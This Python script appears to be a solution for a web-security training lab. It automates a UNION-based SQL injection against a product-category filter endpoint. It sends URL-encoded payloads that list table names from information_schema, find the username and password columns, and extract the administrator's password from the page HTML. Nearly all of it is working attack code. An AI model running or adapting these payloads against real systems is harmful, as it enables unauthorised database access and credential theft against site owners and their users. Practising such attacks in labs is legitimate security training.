'''
This script will perform steps 4-6 in notes.txt
    -Output list of table names in the database
    -Output column names from the selected table
    -Output usernames and password from column
'''
from enum import Flag
import requests 
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



#=========================================
#Function is used for sending the different payloads for the script
#essentially all payloads will be sent via this function
#=========================================
def perform_request(url, sqli_payload):
    path = 'filter?category=Pets'
    r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    return r.text

#=========================================
#Output list of table names in the database
#=========================================
def sqli_users_table(url):
    path = 'filter?category=Pets'
    payload = "%27%20union%20select%20table_name,%20null%20from%20information_schema.tables--"
    res = perform_request(url, payload)    
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False


#=========================================
#Find username and password column names
#=========================================
def sqli_users_columns(url, users_table):
    sqli_payload = f'%27%20UNION%20SELECT%20column_name,%20null%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27{users_table}%27--'
    res = perform_request(url, sqli_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*username.*'))
    password_column = soup.find(text=re.compile('.*password.*'))
    return username_column, password_column


#=========================================
#Output usernames and passwords from columns
#=========================================
def extract_creds(url, username_column, password_column, users_table):
    sqli_payload = f'%27%20UNION%20SELECT%20{username_column},%20{password_column}%20from%20{users_table}--'
    res = perform_request(url, sqli_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(text='administrator').parent.findNext('td').contents[0]
    return admin_password


if __name__== '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    print('Looking for users table...')
    users_table = sqli_users_table(url)
    if users_table:
        print( f'Found the users table name: {users_table}')
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print(f'Found the username column name: {username_column}')
            print(f'Found the password column name: {password_column}')
            admin_creds = extract_creds(url, username_column, password_column, users_table)
            if admin_creds:
                print(f'[+] The administrator password is {admin_creds}')
            else:
                print('[-]Did not find administrator credentials')
        else:
            print('Did not find the username or password columns')
    else:
        print('Did not find users table :(')